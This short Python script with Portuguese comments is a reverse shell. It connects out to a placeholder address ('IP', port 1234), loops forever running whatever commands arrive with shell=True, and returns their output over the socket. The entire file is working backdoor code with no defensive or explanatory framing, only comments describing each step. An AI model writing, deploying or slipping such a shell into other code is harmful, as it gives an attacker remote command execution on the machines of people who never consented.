import socket,subprocess

#IP e porta para conectar
HOST = 'IP' 
PORT = 1234

#Criando um socket TCP/IP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Conectando ao servidor
s.connect((HOST, PORT))

#Loop Indefinido
while True:
     #Recebendo dados do servidor
     data = s.recv(1024)
     #Executando os comandos
     proc = subprocess.Popen(data, shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     #Lendo saída dos comandos
     saida = proc.stdout.read() + proc.stderr.read()
     #Enviando resultado dos comandos
     s.send(saida)
